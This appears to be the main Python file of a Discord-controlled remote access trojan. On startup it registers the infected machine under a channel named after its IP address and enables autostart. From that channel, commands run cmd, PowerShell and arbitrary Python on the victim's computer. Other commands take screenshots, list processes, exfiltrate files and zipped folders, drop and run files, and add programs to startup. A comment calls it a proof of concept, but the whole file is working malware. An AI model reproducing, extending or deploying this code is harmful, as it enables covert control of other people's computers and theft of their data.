# botmain.py
# made 08/02/2026


import discord
import sys
import asyncio
from sendmessage import sendmsg
from discord.ext import commands
from features import *
from handle_cryptography import return_token,return_guildid
from get_sysinfo import get_sysinfo_raw


persistent_ps_session = None

intents = discord.Intents.default()
intents.message_content = True 
intents.guilds = True

TOKEN =  return_token()
  
bot = commands.Bot(command_prefix="!", intents=intents)



@bot.event
async def on_ready():
    global channel
    # 1. Force lowercase and replace dots with hyphens to match Discord's behavior
    raw_ip = str(get_sysinfo_raw()[2])
    ip_normalized = raw_ip.lower().replace(".", "-")

    guild_id = int(return_guildid()) # proof of concept of how a attacker might hide their identification trail.
    guild = await bot.fetch_guild(guild_id)

    if not guild: return

    existing_channel = None
    all_channels = await guild.fetch_channels()
    
    for a_channel in all_channels:
        # 2. Compare normalized name to channel name
        if a_channel.name == ip_normalized:
            existing_channel = a_channel
            break

    if existing_channel:
        channel = existing_channel
    else:
        # 3. Create using the normalized name
        channel = await guild.create_text_channel(ip_normalized)

    await sendmsg(channel, "New Connection.")

    asyncio.create_task(features_autostart_self())

    

@bot.event
async def on_message(message):

    global persistent_ps_session # Saves persistent powershell session to not fuck up every message.
    # channel = message.channel # Ease of coding.

    if message.author == bot.user: # is this a message we sent?
        return
    if message.channel != channel : return

    msgargs = message.content.lower().split(" ") # Gets all the possible arguments.
    raw_msgargs = message.content.split(" ") # used 4 command shit.

    msgcontent = msgargs[0] # The actual 'command' were gonna check.

    if len(msgargs) == 1: # See if there was any arguments. Also prevents out of bounds / list index errors.
     match msgcontent:
        case "moreinfo" | "help2" : await features_moreinfo(channel)
        case "hi" | "hello" : await sendmsg(channel,f"Hi {message.author.name}")
        case "help" | "commands" : await features_help(channel)
        case "sysinfo" | "system_information" : await features_sysinfo(channel)
        case "screenshot" | "ss" : asyncio.create_task(features_screenshot(channel))
        case "create_persistent_ps" | "cp_ps" : persistent_ps_session = await features_create_persistent_ps_session(channel,persistent_ps_session)
        case "allprocs" | "allapps" | "apps" : await features_see_running_apps(channel)
        # rest of no argument commands here...

    elif len(msgargs) > 1: # functions with arguments
     match msgcontent:
        case "run_cmd" | "cmd" | "run_cmd_command" :asyncio.create_task(features_run_cmd(channel,msgargs))
        case "run_ps" | "run_powershell" | "run_powershell_command" : asyncio.create_task(features_run_ps(channel,msgargs))
        case "prun_ps" | "persistent_run_ps" | "ps" : persistent_ps_session = asyncio.create_task(features_prun_ps(channel,msgargs,persistent_ps_session))
        case "download_file" | "gimme" : asyncio.create_task(features_download_file(channel,msgargs))
        case "install_file" | "giveit" : asyncio.create_task(features_install_file(channel,msgargs))
        case "run_file" | "run" | "bark" : asyncio.create_task(features_run_file(channel,msgargs))
        case "zip" | "zip_download" | "gimme_zip" : asyncio.create_task(features_zip_and_download(channel,msgargs))
        case "exec" | "run_py" | "run_python" : asyncio.create_task(features_execute_python_code(channel,raw_msgargs))
        case "add_to_startup" | "ats" | "autostart" : asyncio.create_task(features_add_to_startup(channel,raw_msgargs))
        # rest of argumented commands here...

    
    # This is crucial: it allows @bot.command() functions to run
    await bot.process_commands(message)



@bot.command()
async def quitbot(ctx):
    try:
        sys.exit()
    except Exception as E:
        await ctx.send(Exception)

@bot.command()
async def forcequit(ctx):
    try:
        os._exit(0)
    except Exception as E:
        await ctx.send(Exception)

bot.run(TOKEN)
